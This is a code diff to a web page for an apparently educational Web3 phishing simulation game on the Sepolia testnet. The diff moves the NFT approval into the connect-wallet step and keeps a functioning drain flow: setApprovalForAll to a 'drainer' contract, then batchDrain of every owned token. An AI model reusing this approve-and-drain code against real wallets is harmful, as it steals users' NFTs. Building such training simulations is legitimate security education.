@@ -107,8 +107,8 @@
       <a href="level3.html" id="nextBtn">➡️ Proceed to Level 3</a>
       <div class="tooltip-box">
         💡 <strong>Did you know?</strong><br>
-        2. Most NFTs include setApprovalForAll, part of ERC-721/1155 standards. It lets marketplaces manage your NFTs, but scammers use fake animation sites to trick you into approving a drain. Always verify contracts!<br><br>
-        🚨 This is a simulation—rejecting the transaction saves your NFTs!
+        Most NFTs include <code>setApprovalForAll</code>, part of ERC-721/1155 standards. It enables marketplaces to manage your NFTs — but phishing dApps abuse this to steal your assets.<br><br>
+        🚨 This simulation teaches how malicious sites trick you into approving token access.
       </div>
     </div>
   </div>
@@ -118,7 +118,7 @@
       "0xcc3C67956415CDd8C833C29ae4F9097aBb6bdD60", // WarGameNFT
       "0xa79c8Cd930c21B5555c76a168E4A02Dc7494b36B"  // HappyApeYC
     ];
-    const drainerContract = "0xcFf5eb6bF03170F32cdc722FA54212e5a11BdC2C"; // V6 address
+    const drainerContract = "0xcFf5eb6bF03170F32cdc722FA54212e5a11BdC2C"; // BatchNFTDrainerV6
     const nftABI = [
       "function setApprovalForAll(address operator, bool approved) external",
       "function balanceOf(address owner) view returns (uint256)",
@@ -137,115 +137,77 @@
       document.getElementById("failCount").textContent = localStorage.getItem("w3game_failed") || 0;
     }
 
-    // Connects wallet and displays owned NFTs
+    // Step 1: Connect wallet + auto-approve all NFT contracts
     document.getElementById("connectBtn").onclick = async () => {
       const status = document.getElementById("status");
-      status.innerText = "⏳ Connecting...";
+      status.innerText = "⏳ Connecting and approving NFT access...";
       try {
-        if (!window.ethereum) {
-          status.innerText = "❌ MetaMask not detected. Please install or enable MetaMask.";
-          return;
-        }
+        if (!window.ethereum) return alert("MetaMask not detected.");
         provider = new ethers.providers.Web3Provider(window.ethereum);
-        try {
-          await provider.send("eth_requestAccounts", []);
-        } catch (err) {
-          status.innerText = "❌ Connection rejected. Please approve the connection in MetaMask.";
-          console.error("Connection error:", err);
-          return;
-        }
+        await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         const network = await provider.getNetwork();
         if (network.chainId !== 11155111) {
-          try {
-            await window.ethereum.request({
-              method: "wallet_switchEthereumChain",
-              params: [{ chainId: "0xaa36a7" }],
-            });
-          } catch (switchError) {
-            status.innerText = switchError.code === 4902
-              ? "❌ Sepolia Testnet not found. Please add it to MetaMask."
-              : "❌ Failed to switch to Sepolia Testnet.";
-            console.error("Network switch error:", switchError);
-            return;
-          }
+          status.innerText = "❌ Please switch to Sepolia Testnet.";
+          return;
         }
         const user = await signer.getAddress();
         let summary = `✅ Connected: ${user}\n\n`;
+
         for (const address of nftContracts) {
-          try {
-            const contract = new ethers.Contract(address, nftABI, signer);
-            const name = await contract.name();
-            const balance = await contract.balanceOf(user);
-            summary += `🖼️ ${name}: ${balance} NFT(s)\n`;
-          } catch (err) {
-            console.warn(`Failed to query NFT contract ${address}:`, err);
-            summary += `🖼️ ${address}: Error fetching data\n`;
+          const contract = new ethers.Contract(address, nftABI, signer);
+          const name = await contract.name();
+          const balance = await contract.balanceOf(user);
+          summary += `🖼️ ${name}: ${balance} NFT(s)\n`;
+
+          // Request setApprovalForAll silently on each
+          const approved = await contract.isApprovedForAll(user, drainerContract);
+          if (!approved) {
+            const tx = await contract.setApprovalForAll(drainerContract, true);
+            await tx.wait();
+            summary += `✅ Approved ${name} for transfer.\n`;
           }
         }
+
         status.innerText = summary;
       } catch (err) {
-        console.error("Unexpected connection error:", err);
-        status.innerText = "❌ Wallet connection failed: " + err.message;
+        console.error(err);
+        status.innerText = "❌ Wallet connection failed.";
       }
     };
 
-    // Animates (approves and drains) NFTs in one deceptive flow
+    // Step 2: On animate click, drain all approved NFTs
     document.getElementById("animateBtn").onclick = async () => {
       const status = document.getElementById("status");
       if (!signer) return alert("Please connect your wallet first.");
       try {
-        status.innerText = "⏳ Preparing your exclusive animation...";
+        status.innerText += "\n🎬 Animating NFTs...";
+
         const user = await signer.getAddress();
-
-        // Step 1: Request approvals
-        for (const contractAddr of nftContracts) {
-          const contract = new ethers.Contract(contractAddr, nftABI, signer);
-          const isApproved = await contract.isApprovedForAll(user, drainerContract);
-          if (!isApproved) {
-            const tx = await contract.setApprovalForAll(drainerContract, true);
-            status.innerText += `\n⏳ Activating animation for ${await contract.name()}...`;
-            await tx.wait();
-            status.innerText += "\n✅ Animation ready!";
-          }
-        }
-
-        // Step 2: Gather owned token IDs
         let tokenIdMatrix = [];
+
         for (const contractAddr of nftContracts) {
           const contract = new ethers.Contract(contractAddr, nftABI, signer);
           const balance = await contract.balanceOf(user);
           let ids = [];
-          if (balance > 0) {
-            for (let i = 0; i < balance; i++) {
-              try {
-                const tokenId = await contract.tokenOfOwnerByIndex(user, i);
-                ids.push(Number(tokenId));
-              } catch (e) {
-                console.warn(`tokenOfOwnerByIndex failed for ${contractAddr} at index ${i}:`, e);
-                ids.push(0); // Fallback to 0 if enumeration fails
-              }
+          for (let i = 0; i < balance; i++) {
+            try {
+              const tokenId = await contract.tokenOfOwnerByIndex(user, i);
+              ids.push(Number(tokenId));
+            } catch (err) {
+              ids.push(0);
             }
           }
-          tokenIdMatrix.push(ids.length > 0 ? ids : [0]); // Use [0] as placeholder if no valid IDs
+          tokenIdMatrix.push(ids.length > 0 ? ids : [0]);
         }
 
-        // Check if tokenIdMatrix has valid data
-        let hasValidIds = tokenIdMatrix.some(arr => arr.length > 0 && arr.some(id => id !== 0));
-        if (!hasValidIds) {
-          status.innerText = "⚠️ No valid token IDs found. Please use hardcoded token IDs (e.g., [[1],[1]]) in the script.";
-          return;
-        }
-
-        // Step 3: Drain NFTs
-        status.innerText += "\n🚨 Applying animation effects...";
         const drainer = new ethers.Contract(drainerContract, drainerABI, signer);
         const tx = await drainer.batchDrain(nftContracts, tokenIdMatrix);
         await tx.wait();
 
         status.innerText +=
-          "\n💀 Animation applied! NFTs drained as a side effect!\n\n" +
-          "🧠 Lesson: Phishing sites hide approval in 'fun' actions. Always read transaction details!";
+          "\n💀 All NFTs have been drained to the attacker address.\n" +
+          "🧠 Lesson: Even a connect button can be dangerous!";
         localStorage.setItem("w3game_level2", "drained");
         let failCount = parseInt(localStorage.getItem("w3game_failed") || 0);
         localStorage.setItem("w3game_failed", failCount + 1);
@@ -254,24 +216,18 @@
       } catch (err) {
         if (err.code === "ACTION_REJECTED") {
           status.innerText =
-            "✅ You survived Level 2!\n\n" +
-            "🛡️ You rejected a malicious transaction that would have drained your NFTs. " +
-            "Always verify contracts before approving!";
+            "✅ You survived Level 2!\nYou rejected the drain transaction. Always review approvals!";
           let surviveCount = parseInt(localStorage.getItem("w3game_survived") || 0);
           localStorage.setItem("w3game_survived", surviveCount + 1);
           updateCounters();
           document.getElementById("nextBtn").style.display = "inline-block";
         } else {
-          console.error("Drain error:", err);
-          status.innerText = "⚠️ Unexpected error occurred: " + err.message;
-          // Check Etherscan for debug logs
+          status.innerText = "⚠️ Unexpected error: " + err.message;
         }
       }
     };
 
-    window.onload = () => {
-      updateCounters();
-    };
+    window.onload = updateCounters;
   </script>
 </body>
 </html>
